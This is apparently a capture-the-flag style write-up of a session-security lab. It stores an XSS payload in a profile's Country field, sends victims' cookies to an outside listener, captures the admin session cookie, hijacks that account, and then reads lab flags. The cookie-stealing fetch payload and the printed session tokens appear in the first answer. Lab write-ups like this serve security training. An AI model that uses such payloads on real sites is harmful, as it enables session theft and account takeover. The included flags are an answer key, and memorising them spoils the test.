[Session Security - Skills Assessment]

[*] Target: 10.129.6.4

[*] vHosts needed for these questions:minilab.htb.net 

[Note] Attacking end-users through client-side attacks is in scope for this particular bug bounty program.

[*] Test account credentials:
        
        Email: heavycat106
        Password: rocknrol

[*] Through dirbusting, you identified the following endpoint http://minilab.htb.net/submit-solution

[Question 1] Read the flag residing in the admin's public profile. Answer format: [string]

    - After going to http://minilab.htb.net and login with the given credential, I need to find which parameter is vulnerable for XSS

        <script>fetch(`http://10.10.16.6:5555?Email.php`)</script>

        <script>fetch(`http://10.10.16.6:5555?Phone.php`)</script>

        <script>fetch(`http://10.10.16.6:5555?Country.php`)</script>

        [Note] fetch() function is a built-in JavaScript function used to make HTTP requests to a specified URL and handle the response. 
               It returns a Promise that resolves to the Response object representing the response to the request.

    => I saved this information and click on "Share"

        # python3 -m http.server 5555                                            
        Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
        10.10.16.6 - - [12/Jun/2023 07:28:19] "GET /?Country.php HTTP/1.1" 200 -

    => Country parameter is vulnerable!

    => <script>fetch(`http://10.10.16.6:5555?Country.php?cookie=${btoa(document.cookie)}`)</script> are saved to this parameter

    - Right after I clicked on share, it show me this: 

        10.10.16.6 - - [12/Jun/2023 07:32:51] "GET /?Country.php?cookie=YXV0aC1zZXNzaW9uPXMlM0FMTXFDZ213cGpOeGR6VldrQWdIbWRQejBfUDV0dmJoeC5VdjFkQm9UJTJCV0Vlc3YwTzdKMjB1TDRGeU1yVzRNQzR5cDREVk11ZFRSeUE= HTTP/1.1" 200 -

    => Of course this is our cookie, but we can give this malicious link to the endpoint users

    => I follow the http://minilab.htb.net/submit-solution and they said I can use "?url=" to send the link to the admin

    => http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com

        # python3 -m http.server 5555
        Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
        10.129.6.4 - - [12/Jun/2023 07:37:03] "GET /?Country.php?cookie=YXV0aC1zZXNzaW9uPXMlM0EzNWNnV2lUYzRXc05kWEtzVjF4SEFjMnRKTDZKQUhMYy5rJTJGYkZkekUxM3BOMXMlMkJ0Q1REZWFFJTJGQ2lycG42T29oUjBMcUNpVFRzOFM4 HTTP/1.1" 200 -

        [Note] After base64 decode, we have auth-session=s%3A35cgWiTc4WsNdXKsV1xHAc2tJL6JAHLc.k%2FbFdzE13pN1s%2BtCTDeaE%2FCirpn6OohR0LqCiTTs8S8

    => We have the admin's cookie, use it to access his/her profile 

    - We so we are Super Admin now let's read admin's public profile => [YOU_ARE_A_SESSION_WARRIOR]

    [!] Answer: "[YOU_ARE_A_SESSION_WARRIOR]"

[Question 2] Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}

    - So you are in the http://minilab.htb.net/profile?email=superadmin@htb.net right, click on the "Flag2" to download this pcap file

    - Open it with Wireshark

    => Edit -> Find Packet >> Left-click on Packet list and then click Packet bytes >> Select String on the third drop-down menu and specify the "FLAG"

    => FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}

    [!] Answer: "FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}"
